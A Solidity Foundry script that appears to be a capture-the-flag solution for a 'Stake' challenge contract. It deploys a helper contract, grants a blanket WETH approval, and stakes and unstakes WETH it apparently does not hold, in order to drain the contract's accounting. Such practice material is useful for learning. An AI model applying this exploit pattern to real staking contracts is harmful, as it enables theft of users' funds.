// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Stake.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    Stake stakeInstance;

    constructor (address _address) {
        stakeInstance = Stake(_address);
    }

    function StakeETH() public payable {
        stakeInstance.StakeETH{ value: msg.value }();
    }
}

contract StakeSolution is Script {
    Stake public stakeInstance = Stake(0x923C6290A62b9642a7fF3B5f6EC7f49d011B92DF);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));

        uint256 amount = 0.0011 ether + 0.0001 ether; // 0.0012

        AttackerContract attackerContract = new AttackerContract(address(stakeInstance));

        attackerContract.StakeETH{ value: amount }();

        address(stakeInstance.WETH()).call(abi.encodeWithSignature("approve(address,uint256)", address(stakeInstance), type(uint256).max));
        
        stakeInstance.StakeWETH(amount - 0.0001 ether);
        stakeInstance.Unstake(amount - 0.0001 ether);

        vm.stopBroadcast();
    }
}
